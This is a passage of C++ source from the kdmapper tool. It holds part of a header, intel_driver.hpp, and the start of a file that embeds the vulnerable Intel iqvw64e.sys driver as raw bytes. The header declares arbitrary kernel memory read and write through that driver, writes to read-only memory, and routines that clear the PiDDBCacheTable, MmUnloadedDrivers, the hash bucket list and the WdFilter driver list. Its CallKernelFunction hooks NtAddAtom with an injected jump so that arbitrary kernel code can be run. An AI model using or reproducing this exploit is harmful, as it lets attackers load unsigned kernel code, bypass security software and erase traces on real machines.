	constexpr DWORD iqvw64e_timestamp = 0x5284EAC3;
	extern ULONG64 ntoskrnlAddr;

	typedef struct _COPY_MEMORY_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved;
		uint64_t source;
		uint64_t destination;
		uint64_t length;
	}COPY_MEMORY_BUFFER_INFO, * PCOPY_MEMORY_BUFFER_INFO;

	typedef struct _FILL_MEMORY_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved1;
		uint32_t value;
		uint32_t reserved2;
		uint64_t destination;
		uint64_t length;
	}FILL_MEMORY_BUFFER_INFO, * PFILL_MEMORY_BUFFER_INFO;

	typedef struct _GET_PHYS_ADDRESS_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved;
		uint64_t return_physical_address;
		uint64_t address_to_translate;
	}GET_PHYS_ADDRESS_BUFFER_INFO, * PGET_PHYS_ADDRESS_BUFFER_INFO;

	typedef struct _MAP_IO_SPACE_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved;
		uint64_t return_value;
		uint64_t return_virtual_address;
		uint64_t physical_address_to_map;
		uint32_t size;
	}MAP_IO_SPACE_BUFFER_INFO, * PMAP_IO_SPACE_BUFFER_INFO;

	typedef struct _UNMAP_IO_SPACE_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved1;
		uint64_t reserved2;
		uint64_t virt_address;
		uint64_t reserved3;
		uint32_t number_of_bytes;
	}UNMAP_IO_SPACE_BUFFER_INFO, * PUNMAP_IO_SPACE_BUFFER_INFO;

	typedef struct _RTL_BALANCED_LINKS {
		struct _RTL_BALANCED_LINKS* Parent;
		struct _RTL_BALANCED_LINKS* LeftChild;
		struct _RTL_BALANCED_LINKS* RightChild;
		CHAR Balance;
		UCHAR Reserved[3];
	} RTL_BALANCED_LINKS;
	typedef RTL_BALANCED_LINKS* PRTL_BALANCED_LINKS;

	typedef struct _RTL_AVL_TABLE {
		RTL_BALANCED_LINKS BalancedRoot;
		PVOID OrderedPointer;
		ULONG WhichOrderedElement;
		ULONG NumberGenericTableElements;
		ULONG DepthOfTree;
		PVOID RestartKey;
		ULONG DeleteCount;
		PVOID CompareRoutine;
		PVOID AllocateRoutine;
		PVOID FreeRoutine;
		PVOID TableContext;
	} RTL_AVL_TABLE;
	typedef RTL_AVL_TABLE* PRTL_AVL_TABLE;

	typedef struct _PiDDBCacheEntry
	{
		LIST_ENTRY		List;
		UNICODE_STRING	DriverName;
		ULONG			TimeDateStamp;
		NTSTATUS		LoadStatus;
		char			_0x0028[16]; // data from the shim engine, or uninitialized memory for custom drivers
	} PiDDBCacheEntry, * NPiDDBCacheEntry;

	typedef struct _HashBucketEntry
	{
		struct _HashBucketEntry* Next;
		UNICODE_STRING DriverName;
		ULONG CertHash[5];
	} HashBucketEntry, * PHashBucketEntry;

	bool ClearPiDDBCacheTable(HANDLE device_handle);
	bool ExAcquireResourceExclusiveLite(HANDLE device_handle, PVOID Resource, BOOLEAN wait);
	bool ExReleaseResourceLite(HANDLE device_handle, PVOID Resource);
	BOOLEAN RtlDeleteElementGenericTableAvl(HANDLE device_handle, PVOID Table, PVOID Buffer);
	PVOID RtlLookupElementGenericTableAvl(HANDLE device_handle, PRTL_AVL_TABLE Table, PVOID Buffer);
	PiDDBCacheEntry* LookupEntry(HANDLE device_handle, PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t * name);
	PVOID ResolveRelativeAddress(HANDLE device_handle, _In_ PVOID Instruction, _In_ ULONG OffsetOffset, _In_ ULONG InstructionSize);

	uintptr_t FindPatternAtKernel(HANDLE device_handle, uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask);
	uintptr_t FindSectionAtKernel(HANDLE device_handle, const char* sectionName, uintptr_t modulePtr, PULONG size);
	uintptr_t FindPatternInSectionAtKernel(HANDLE device_handle, const char* sectionName, uintptr_t modulePtr, BYTE* bMask, const char* szMask);

	bool ClearKernelHashBucketList(HANDLE device_handle);
	bool ClearWdFilterDriverList(HANDLE device_handle);

	bool IsRunning();
	HANDLE Load();
	bool Unload(HANDLE device_handle);

	bool MemCopy(HANDLE device_handle, uint64_t destination, uint64_t source, uint64_t size);
	bool SetMemory(HANDLE device_handle, uint64_t address, uint32_t value, uint64_t size);
	bool GetPhysicalAddress(HANDLE device_handle, uint64_t address, uint64_t* out_physical_address);
	uint64_t MapIoSpace(HANDLE device_handle, uint64_t physical_address, uint32_t size);
	bool UnmapIoSpace(HANDLE device_handle, uint64_t address, uint32_t size);
	bool ReadMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size);
	bool WriteMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size);
	bool WriteToReadOnlyMemory(HANDLE device_handle, uint64_t address, void* buffer, uint32_t size);
	/*added by herooyyy*/
	uint64_t MmAllocateIndependentPagesEx(HANDLE device_handle, uint32_t size);
	bool MmFreeIndependentPages(HANDLE device_handle, uint64_t address, uint32_t size);
	BOOLEAN MmSetPageProtection(HANDLE device_handle, uint64_t address, uint32_t size, ULONG new_protect);
	
	uint64_t AllocatePool(HANDLE device_handle, nt::POOL_TYPE pool_type, uint64_t size);
	/*added by psec*/
	uint64_t MmAllocatePagesForMdl(HANDLE device_handle, LARGE_INTEGER LowAddress, LARGE_INTEGER HighAddress, LARGE_INTEGER SkipBytes, SIZE_T TotalBytes);
	uint64_t MmMapLockedPagesSpecifyCache(HANDLE device_handle, uint64_t pmdl, nt::KPROCESSOR_MODE AccessMode, nt::MEMORY_CACHING_TYPE CacheType, uint64_t RequestedAddress, ULONG BugCheckOnFailure, ULONG Priority);
	bool MmProtectMdlSystemAddress(HANDLE device_handle, uint64_t MemoryDescriptorList, ULONG NewProtect);
	bool MmUnmapLockedPages(HANDLE device_handle, uint64_t BaseAddress, uint64_t pmdl);
	bool MmFreePagesFromMdl(HANDLE device_handle, uint64_t MemoryDescriptorList);
	/**/

	bool FreePool(HANDLE device_handle, uint64_t address);
	uint64_t GetKernelModuleExport(HANDLE device_handle, uint64_t kernel_module_base, const std::string& function_name);
	bool ClearMmUnloadedDrivers(HANDLE device_handle);
	std::wstring GetDriverNameW();
	std::wstring GetDriverPath();

	template<typename T, typename ...A>
	bool CallKernelFunction(HANDLE device_handle, T* out_result, uint64_t kernel_function_address, const A ...arguments) {
		constexpr auto call_void = std::is_same_v<T, void>;

		if constexpr (!call_void) {
			if (!out_result)
				return false;
		}
		else {
			UNREFERENCED_PARAMETER(out_result);
		}

		if (!kernel_function_address)
			return false;

		// Setup function call
		HMODULE ntdll = GetModuleHandleA("ntdll.dll");
		if (ntdll == 0) {
			Log(L"[-] Failed to load ntdll.dll" << std::endl); //never should happens
			return false;
		}

		const auto NtAddAtom = reinterpret_cast<void*>(GetProcAddress(ntdll, "NtAddAtom"));
		if (!NtAddAtom)
		{
			Log(L"[-] Failed to get export ntdll.NtAddAtom" << std::endl);
			return false;
		}

		uint8_t kernel_injected_jmp[] = { 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
		uint8_t original_kernel_function[sizeof(kernel_injected_jmp)];
		*(uint64_t*)&kernel_injected_jmp[2] = kernel_function_address;

		static uint64_t kernel_NtAddAtom = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "NtAddAtom");
		if (!kernel_NtAddAtom) {
			Log(L"[-] Failed to get export ntoskrnl.NtAddAtom" << std::endl);
			return false;
		}

		if (!ReadMemory(device_handle, kernel_NtAddAtom, &original_kernel_function, sizeof(kernel_injected_jmp)))
			return false;

		if (original_kernel_function[0] == kernel_injected_jmp[0] &&
			original_kernel_function[1] == kernel_injected_jmp[1] &&
			original_kernel_function[sizeof(kernel_injected_jmp) - 2] == kernel_injected_jmp[sizeof(kernel_injected_jmp) - 2] &&
			original_kernel_function[sizeof(kernel_injected_jmp) - 1] == kernel_injected_jmp[sizeof(kernel_injected_jmp) - 1]) {
			Log(L"[-] FAILED!: The code was already hooked!! another instance of kdmapper running?!" << std::endl);
			return false;
		}

		// Overwrite the pointer with kernel_function_address
		if (!WriteToReadOnlyMemory(device_handle, kernel_NtAddAtom, &kernel_injected_jmp, sizeof(kernel_injected_jmp)))
			return false;

		// Call function
		if constexpr (!call_void) {
			using FunctionFn = T(__stdcall*)(A...);
			const auto Function = reinterpret_cast<FunctionFn>(NtAddAtom);

			*out_result = Function(arguments...);
		}
		else {
			using FunctionFn = void(__stdcall*)(A...);
			const auto Function = reinterpret_cast<FunctionFn>(NtAddAtom);

			Function(arguments...);
		}

		// Restore the pointer/jmp
		return WriteToReadOnlyMemory(device_handle, kernel_NtAddAtom, original_kernel_function, sizeof(kernel_injected_jmp));
	}
}

```

`kdmapper/kdmapper/intel_driver_resource.hpp`:

```hpp
#pragma once
#include <stdint.h>

namespace intel_driver_resource
{
	static const uint8_t driver[] = {
		0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xD8, 0x00, 0x00, 0x00, 0x0E, 0x1F, 0xBA, 0x0E, 0x00, 0xB4, 0x09, 0xCD, 0x21, 0xB8, 0x01, 0x4C, 0xCD, 0x21, 0x54, 0x68,
		0x69, 0x73, 0x20, 0x70, 0x72, 0x6F, 0x67, 0x72, 0x61, 0x6D, 0x20, 0x63, 0x61, 0x6E, 0x6E, 0x6F, 0x74, 0x20, 0x62, 0x65, 0x20, 0x72, 0x75, 0x6E, 0x20, 0x69, 0x6E, 0x20, 0x44, 0x4F, 0x53, 0x20, 0x6D, 0x6F, 0x64, 0x65, 0x2E, 0x0D, 0x0D, 0x0A,
		0x24, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x47, 0x85, 0xC5, 0x87, 0x03, 0xE4, 0xAB, 0xD4, 0x03, 0xE4, 0xAB, 0xD4, 0x03, 0xE4, 0xAB, 0xD4, 0x03, 0xE4, 0xAA, 0xD4, 0x24, 0xE4, 0xAB, 0xD4, 0x75, 0x79, 0xD0, 0xD4, 0x06, 0xE4, 0xAB, 0xD4,
		0x75, 0x79, 0xD6, 0xD4, 0x00, 0xE4, 0xAB, 0xD4, 0x75, 0x79, 0xC6, 0xD4, 0x04, 0xE4, 0xAB, 0xD4, 0xC0, 0xEB, 0xF5, 0xD4, 0x02, 0xE4, 0xAB, 0xD4, 0x75, 0x79, 0xD3, 0xD4, 0x02, 0xE4, 0xAB, 0xD4, 0x52, 0x69, 0x63, 0x68, 0x03, 0xE4, 0xAB, 0xD4,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x45, 0x00, 0x00, 0x64, 0x86, 0x06, 0x00, 0xC3, 0xEA, 0x84, 0x52, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF0, 0x00, 0x22, 0x00,
		0x0B, 0x02, 0x08, 0x00, 0x00, 0x50, 0x00, 0x00, 0x00, 0xB2, 0x5C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x22, 0x5D, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00,
		0x05, 0x00, 0x02, 0x00, 0x05, 0x00, 0x02, 0x00, 0x05, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x5D, 0x00, 0x00, 0x04, 0x00, 0x00, 0x2A, 0x32, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0xDC, 0x22, 0x5D, 0x00, 0x3C, 0x00, 0x00, 0x00, 0x00, 0x30, 0x5D, 0x00, 0xF8, 0x03, 0x00, 0x00, 0x00, 0x10, 0x5D, 0x00, 0x08, 0x04, 0x00, 0x00, 0x00, 0x68, 0x00, 0x00, 0x08, 0x1F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x50, 0x61, 0x00, 0x00, 0x1C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x48, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x2E, 0x74, 0x65, 0x78, 0x74, 0x00, 0x00, 0x00, 0x15, 0x46, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x68,
		0x2E, 0x72, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0xC0, 0x07, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x4C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x48,
		0x2E, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00, 0xC0, 0x9E, 0x5C, 0x00, 0x00, 0x70, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x54, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0xC8,
		0x2E, 0x70, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x08, 0x04, 0x00, 0x00, 0x00, 0x10, 0x5D, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x56, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x48,
		0x49, 0x4E, 0x49, 0x54, 0x00, 0x00, 0x00, 0x00, 0xA8, 0x07, 0x00, 0x00, 0x00, 0x20, 0x5D, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x5C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0xE2,
		0x2E, 0x72, 0x73, 0x72, 0x63, 0x00, 0x00, 0x00, 0xF8, 0x03, 0x00, 0x00, 0x00, 0x30, 0x5D, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x42,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x48, 0x53, 0x48, 0x83, 0xEC, 0x30, 0x48, 0x8B, 0xD9, 0x48, 0x8D, 0x0D, 0xA0, 0x37, 0x00, 0x00, 0xE8, 0x0B, 0x0F, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x84, 0x37, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0xFF, 0x15, 0x69, 0x50, 0x00, 0x00, 0x48,
		0x8D, 0x4C, 0x24, 0x20, 0xFF, 0x15, 0xE6, 0x50, 0x00, 0x00, 0x48, 0x8B, 0x4B, 0x08, 0x48, 0x85, 0xC9, 0x74, 0x18, 0xFF, 0x15, 0xE7, 0x50, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x28, 0x37, 0x00, 0x00, 0xE8, 0xD3, 0x0E, 0x00, 0x00, 0x48, 0x83, 0xC4,
		0x30, 0x5B, 0xC3, 0x48, 0x8D, 0x0D, 0xC6, 0x36, 0x00, 0x00, 0xE8, 0xC1, 0x0E, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x0A, 0x37, 0x00, 0x00, 0xE8, 0xB5, 0x0E, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x30, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8D, 0x0D, 0xA3, 0x38, 0x00, 0x00, 0x48, 0x8B, 0xDA, 0xE8, 0x8B, 0x0E, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x74, 0x60, 0x00, 0x00, 0xE8, 0x1F, 0x0E, 0x00,
		0x00, 0x45, 0x33, 0xDB, 0x33, 0xD2, 0x48, 0x8B, 0xCB, 0x4C, 0x89, 0x5B, 0x38, 0x44, 0x89, 0x5B, 0x30, 0xFF, 0x15, 0x61, 0x4F, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x42, 0x38, 0x00, 0x00, 0xE8, 0x5D, 0x0E, 0x00, 0x00, 0x33, 0xC0, 0x48, 0x83, 0xC4,
		0x20, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8D, 0x0D, 0xA3, 0x38, 0x00, 0x00, 0x48, 0x8B, 0xDA,
		0xE8, 0x2B, 0x0E, 0x00, 0x00, 0x45, 0x33, 0xDB, 0x33, 0xD2, 0x48, 0x8B, 0xCB, 0x4C, 0x89, 0x5B, 0x38, 0x44, 0x89, 0x5B, 0x30, 0xFF, 0x15, 0x0D, 0x4F, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0xFE, 0x5F, 0x00, 0x00, 0xE8, 0xC9, 0x0D, 0x00, 0x00, 0x48,
		0x8D, 0x0D, 0x42, 0x38, 0x00, 0x00, 0xE8, 0xFD, 0x0D, 0x00, 0x00, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0x48, 0x83, 0xEC, 0x28, 0x48, 0x8B, 0x82, 0xB8, 0x00, 0x00, 0x00, 0x48, 0x89, 0x5C, 0x24, 0x40, 0x48, 0x89, 0x7C, 0x24, 0x48, 0x48, 0x8B, 0x48, 0x20, 0x48, 0x8B, 0xFA, 0x8B, 0x50, 0x18, 0x48, 0x85, 0xC9, 0x74, 0x57, 0x81, 0xFA, 0x07, 0x20,
		0x86, 0x80, 0x74, 0x46, 0x81, 0xFA, 0x0B, 0x20, 0x86, 0x80, 0x74, 0x35, 0x81, 0xFA, 0x0F, 0x20, 0x86, 0x80, 0x74, 0x24, 0x81, 0xFA, 0x13, 0x20, 0x86, 0x80, 0x74, 0x13, 0x48, 0x8D, 0x0D, 0x65, 0x38, 0x00, 0x00, 0xBB, 0x0D, 0x00, 0x00, 0xC0,
		0xE8, 0x8B, 0x0D, 0x00, 0x00, 0xEB, 0x35, 0xE8, 0xF4, 0x2D, 0x00, 0x00, 0x8B, 0xD8, 0xEB, 0x2C, 0xE8, 0x7B, 0x01, 0x00, 0x00, 0x8B, 0xD8, 0xEB, 0x23, 0xE8, 0xA2, 0x08, 0x00, 0x00, 0x8B, 0xD8, 0xEB, 0x1A, 0xE8, 0xF9, 0x01, 0x00, 0x00, 0x8B,
		0xD8, 0xEB, 0x11, 0x48, 0x8D, 0x0D, 0xFE, 0x37, 0x00, 0x00, 0xE8, 0x59, 0x0D, 0x00, 0x00, 0xBB, 0x0D, 0x00, 0x00, 0xC0, 0x33, 0xD2, 0x48, 0x8B, 0xCF, 0x48, 0xC7, 0x47, 0x38, 0x00, 0x00, 0x00, 0x00, 0x89, 0x5F, 0x30, 0xFF, 0x15, 0x36, 0x4E,
		0x00, 0x00, 0x48, 0x8B, 0x7C, 0x24, 0x48, 0x8B, 0xC3, 0x48, 0x8B, 0x5C, 0x24, 0x40, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x8B, 0x05, 0x0A, 0x5F, 0x00, 0x00, 0xC3, 0xCC,
		0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x53, 0x4C, 0x8B, 0x19, 0x45, 0x32, 0xD2, 0x45, 0x33, 0xC0, 0x4D, 0x8B, 0xC8, 0x49, 0x8B, 0xC0, 0x48, 0x8D, 0x1D, 0x88, 0xEC, 0x5B, 0x00, 0x4C, 0x39, 0x1C, 0x18, 0x75, 0x0A, 0x80, 0xBC,
		0x18, 0x08, 0x01, 0x00, 0x00, 0x01, 0x74, 0x13, 0x48, 0x05, 0x10, 0x01, 0x00, 0x00, 0x49, 0xFF, 0xC1, 0x48, 0x3D, 0x00, 0x10, 0x01, 0x00, 0x72, 0xDF, 0xEB, 0x22, 0x84, 0xD2, 0x75, 0x1B, 0x49, 0x8B, 0xC1, 0x41, 0xB2, 0x01, 0x48, 0x69, 0xC0,
		0x10, 0x01, 0x00, 0x00, 0x44, 0x88, 0x84, 0x18, 0x08, 0x01, 0x00, 0x00, 0x4C, 0x89, 0x04, 0x18, 0xEB, 0x03, 0x45, 0x32, 0xD2, 0x49, 0x81, 0xF9, 0x00, 0x01, 0x00, 0x00, 0x75, 0x24, 0x80, 0xFA, 0x01, 0x75, 0x45, 0x49, 0x8B, 0xC8, 0x66, 0x90,
		0x48, 0x83, 0x3C, 0x19, 0x00, 0x74, 0x18, 0x48, 0x81, 0xC1, 0x10, 0x01, 0x00, 0x00, 0x49, 0xFF, 0xC0, 0x48, 0x81, 0xF9, 0x00, 0x10, 0x01, 0x00, 0x72, 0xE6, 0x41, 0x8A, 0xC2, 0x5B, 0xC3, 0x49, 0x81, 0xF8, 0x00, 0x01, 0x00, 0x00, 0x73, 0xF2,
		0x4D, 0x69, 0xC0, 0x10, 0x01, 0x00, 0x00, 0xB0, 0x01, 0x4D, 0x89, 0x1C, 0x18, 0x41, 0xC6, 0x84, 0x18, 0x08, 0x01, 0x00, 0x00, 0x01, 0x5B, 0xC3, 0x41, 0x0F, 0xB6, 0xC2, 0xB9, 0x01, 0x00, 0x00, 0x00, 0x84, 0xD2, 0x0F, 0x44, 0xC1, 0x5B, 0xC3,
		0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x8B, 0x11, 0x4C, 0x8D, 0x05, 0xC6, 0xEB, 0x5B, 0x00, 0x33, 0xC9, 0x66, 0x66, 0x66, 0x90, 0x4A, 0x39, 0x14, 0x01, 0x75, 0x0B, 0x42, 0x80,
		0xBC, 0x01, 0x08, 0x01, 0x00, 0x00, 0x01, 0x74, 0x13, 0x48, 0x81, 0xC1, 0x10, 0x01, 0x00, 0x00, 0x48, 0x81, 0xF9, 0x00, 0x10, 0x01, 0x00, 0x72, 0xDF, 0x32, 0xC0, 0xC3, 0xB0, 0x01, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0x48, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x85, 0xC9, 0x74, 0x72, 0x48, 0x8B, 0x01, 0x48, 0xFF, 0xC8, 0x74, 0x4E, 0x48, 0xFF, 0xC8, 0x74, 0x2C, 0x48, 0xFF, 0xC8, 0x74, 0x0B, 0xB8, 0x18, 0x20, 0x6A, 0xC8, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3,
		0x48, 0x8D, 0x59, 0x10, 0x48, 0x85, 0xDB, 0x74, 0x44, 0x48, 0x8B, 0x4B, 0x08, 0xE8, 0x86, 0x2A, 0x00, 0x00, 0x89, 0x03, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0x48, 0x8D, 0x59, 0x10, 0x48, 0x85, 0xDB, 0x74, 0x0C, 0x48, 0x8B, 0x4B,
		0x08, 0xE8, 0x7A, 0x2A, 0x00, 0x00, 0x88, 0x43, 0x04, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0x48, 0x8D, 0x59, 0x10, 0x48, 0x85, 0xDB, 0x74, 0x0B, 0x48, 0x8B, 0x4B, 0x08, 0xE8, 0x4D, 0x2A, 0x00, 0x00, 0x89, 0x03, 0x33, 0xC0, 0x48,
